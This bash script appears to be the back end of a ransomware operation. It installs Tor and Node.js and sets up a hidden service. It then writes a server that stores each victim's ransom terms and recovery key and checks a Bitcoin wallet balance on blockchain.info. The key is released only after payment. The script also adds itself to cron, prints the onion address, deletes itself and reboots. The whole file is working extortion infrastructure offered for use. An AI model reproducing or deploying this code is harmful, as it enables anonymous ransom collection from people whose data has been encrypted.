#!/bin/bash

dir="$(cd "$(dirname "$0")"; pwd)"
cd /

sed -i 's/# deb /deb /g' /etc/apt/sources.list
sed -i 's/\/\/.*archive.ubuntu.com/\/\/archive.ubuntu.com/g' /etc/apt/sources.list

export DEBIAN_FRONTEND=noninteractive
echo "deb http://deb.torproject.org/torproject.org $(lsb_release -c | awk '{print $2}') main" >> /etc/apt/sources.list
gpg --keyserver keys.gnupg.net --recv 886DDD89
gpg --export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | apt-key add -
apt-get -y --force-yes update
apt-get -y --force-yes upgrade
apt-get -y --force-yes install deb.torproject.org-keyring tor nodejs-legacy npm

npm install level request express body-parser

echo '
	HiddenServiceDir /var/lib/tor/hidden_service/
	HiddenServicePort 80 127.0.0.1:8080
' >> /etc/tor/torrc

mkdir /var/lib/tor/hidden_service/
chown -R debian-tor:debian-tor /var/lib/tor/hidden_service/
chmod -R 0700 /var/lib/tor/hidden_service/

service tor stop
killall tor
service tor start


cat > /server.js << EndOfMessage
#!/usr/bin/env node

var db = require('level')('/ransoms');

var request = require('request');

var app = require('express')();
app.use(require('body-parser').json());

var failureMessage = 'fak u gooby';

function getTargetFromRequest (req) {
	return req.url.split('/').slice(-1)[0];
}

app.get('/*', function(req, res) {
	var target = getTargetFromRequest(req);

	db.get(target, function (_, val) {
		try {
			var o = JSON.parse(val);
		}
		catch (_) {
			res.end(failureMessage);
			return;
		}

		try {
			request(
				'https://blockchain.info/rawaddr/' + o.walletAddress + '?balance_unit=satoshi',
				function (_, _, body) {
					try {
						var balance = JSON.parse(body).total_received * 0.00000001;

						if (balance >= o.ransomAmount) {
							res.end(o.recoveryKey);
							return
						}
					}
					catch (_) {}

					res.end('');
				}
			);
		}
		catch (_) {
			res.end('');
		}
	});
});

app.post('/*', function(req, res) {
	var target = getTargetFromRequest(req);

	db.get(target, function (err) {
		if (!err) {
			res.end(failureMessage);
			return;
		}

		db.put(target, JSON.stringify(req.body), function (err) {
			res.end(
				err ?
					failureMessage :
					'ransom setup complete'
			);
		});
	});
});

app.listen(8080);
EndOfMessage


chmod 700 /server.js

crontab -l > /tmp.cron
echo '@reboot /server.js' >> /tmp.cron
crontab /tmp.cron
rm /tmp.cron

cat /var/lib/tor/hidden_service/hostname

cd "${dir}"
rm backend.sh
reboot
